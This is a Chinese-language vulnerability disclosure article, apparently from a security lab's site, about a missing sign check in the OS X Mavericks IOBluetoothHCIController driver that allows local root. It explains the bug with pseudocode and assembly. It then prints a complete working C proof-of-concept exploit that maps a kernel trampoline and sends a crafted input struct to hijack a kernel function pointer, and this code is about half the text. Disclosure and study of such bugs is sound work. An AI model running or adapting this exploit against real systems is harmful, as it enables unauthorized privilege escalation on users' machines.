Mac OS X本地权限提升漏洞(IOBluetoothFamily)(更新EXP)

2014-10-30 23:23:08 阅读：20236次 点赞(0) 收藏 来源： 360网络攻防实验室

现如今，由于一些防护措施的广泛运用，想在用户级上寻找漏洞变得越来越困难，这些保护措施包括ASLR、 NX,各式各样的heap protections、 stack canaries，还有沙箱。所以相比起突破这些层层保护，攻击者们更愿意寻找一些“简单”的方法。所以他们把目标移到了保护技术还不是很成熟的内核级，过去几个月中Windows、Linux和OS X不断增加的内核级漏洞也证实了这一点。

根据这一趋势，我们最近研究了几个 OS X 的驱动程序，发现了一个影响IOBluetoothHCIController 的整数符号的bug，这个bug可被攻击者利用来获取本地的root权限，这个问题存在于最新版本的OS X Mavericks上（10.9.4 and 10.9.5测试成功），但却在 OS X Yosemite上被悄悄的修复了。

漏洞概述

简而言之，漏洞存在于IOBluetoothHCIUserClient::SimpleDispatchWL()这个函数中，这个函数需要用户提供一个32位带符号的整数值，然后把它指向一个包含函数指针的全局结构数组，这个函数指针最终被调用。不难看出，SimpleDispatchWL()没有正确处理用户提供的索引，如果用户能够控制这个函数指针，悲剧就发生了。

更多的细节我们用下面的伪代码来表述，在第14行，用户提供的一个32位整数值被转为64位。在第20行method_index参数带入了_sRoutines数组，在第23行被回调。

typedef struct {  void (*function_pointer)();
  uint64 num_arguments;
} BluetoothMethod;

BluetoothMethod _sRoutines[] = {
  ...
};

uint64 _sRoutineCount = sizeof(_sRoutines)/sizeof(BluetoothMethod);

IOReturn IOBluetoothHCIUserClient::SimpleDispatchWL(IOBluetoothHCIDispatchParams *params) {  // Here "user_param" is a signed 32-bit integer parameter
  int64 method_index = (int64) user_param;  if (method_index >= _sRoutineCount) {    return kIOReturnUnsupported;
  }

  BluetoothMethod method = _sRoutines[method_index];
  ...  if (method.num_arguments < 8) {
       method.function_pointer(...);
  }
  ...  
}

详情请见下面的汇编代码

; r12+70h points to the user-supplied index value
mov     ecx, [r12+70h]
mov     r13d, kIOReturnUnsupported

cmp     ecx, [rdx]
jge     fail
; Go on and fetch _sRoutine[method_index]
...

mov     esi, [rdx+rax+8]     ; esi = _sRoutines[method_index].num_arguments
cmp     esi, 7               ; Check method.num_arguments < 8

漏洞修复

目前证实存在问题的系统包括OS X Mavericks 10.9.4 和10.9.5，但是在新系统OS X Yosemite (10.10)上，这个漏洞被悄悄的修复了，苹果官方也没有任何安全公告提及这个漏洞。

结论

我们在2014年10月20日联系了苹果公司，但是不幸的是，我们目前没有得到任何的答复。所以我们决定公开披露这个漏洞的细节，Yosemite现在已经对用户免费开放，所以我们不认为我们公开披露的这个漏洞会最终危机到用户。

/*
 * pwn.c, by @rpaleari and @joystick
 *
 * This PoC exploits a missing sign check in
 * IOBluetoothHCIUserClient::SimpleDispatchWL().
 *
 * Tested on  Mac OS X Mavericks (10.9.4/10.9.5).
 *
 * Compile with: gcc -Wall -o pwn{,.c} -framework IOKit
 * 
 */

#include <stdio.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

#include <IOKit/IOKitLib.h>

uint64_t payload() {
  /* Your payload goes here. */
}

int main(void) {
  /* Map our landing page (kernel will jump at tgt+7) */
  vm_address_t tgt = 0x0000048800000000; 
  vm_allocate(mach_task_self(), &tgt, 0x1000, 0);
  vm_protect(mach_task_self(), tgt, 0x1000, 0,
	     VM_PROT_READ|VM_PROT_WRITE|VM_PROT_EXECUTE);
  memset((void *)tgt, 0, 0x1000);

  /* Prepare payload */
  char *target = (char *)tgt;
  
  /* mov rax, payload */
  target[7] = 0x48;
  target[8] = 0xb8;
  *((uint64_t *)(&target[9])) = (uint64_t) payload;
  
  /* jmp rax */
  target[17] = 0xff;
  target[18] = 0xe0;

  printf(" [+] Payload function  @ %016llx\n", (uint64_t) payload);
  printf(" [+] Stored trampoline @ %016llx\n", (uint64_t) tgt+7);

  /* Find the vulnerable service */
  io_service_t service =
    IOServiceGetMatchingService(kIOMasterPortDefault,
				IOServiceMatching("IOBluetoothHCIController"));
  
  if (!service) {
    return -1;
  }

  /* Connect to the vulnerable service */
  io_connect_t port = (io_connect_t) 0;
  kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &port);
  IOObjectRelease(service);
  if (kr != kIOReturnSuccess) {
    return kr;
  }

  printf(" [+] Opened connection to service on port: %d\n", port);

  /* The first 8 bytes must be 0, so we don't have to handle following
     parameters */
  char a[] = "\x00\x00\x00\x00\x00\x00\x00\x00" 
    /* Don't really matter for the exploit (ignored due to the 0s above) */
    "\x00\x00\x00\x00\x00\x00\x00\x07\x02\x00\x00\x00\x11\x0a\x00\x00\x03\x72\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\xfa\x2a\x54\xff\x7f\x00\x00\x78\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\xa8\xfb\x2a\x54\xff\x7f\x00\x00\xd8\xfa\x2a\x54\xff\x7f\x00\x00\x60\x4a\xb6\x86"
    "\x80\xff\xff\xff"
    /* Index value 0xfff5b6a8 makes _sRoutines[index] point to an in-kernel
       memory area that contains {0x0000048800000007, N}, with 0 <= N < 8. May
       need to be adjusted on other Mavericks versions. */
    "\xa8\xb6\xf5\xff\x80\xff\xff\xff"; 
  
  printf(" [+] Launching exploit!\n");
  kr = IOConnectCallMethod((mach_port_t) port,      /* Connection      */
                           (uint32_t) 0,            /* Selector        */
                           NULL, 0,                 /* input, inputCnt */
                           (const void*) a,         /* inputStruct     */
                           sizeof(a),               /* inputStructCnt  */
                           NULL, NULL, NULL, NULL); /* Output stuff    */

  /* Exec shell here after payload returns */
  
  return IOServiceClose(port);
}
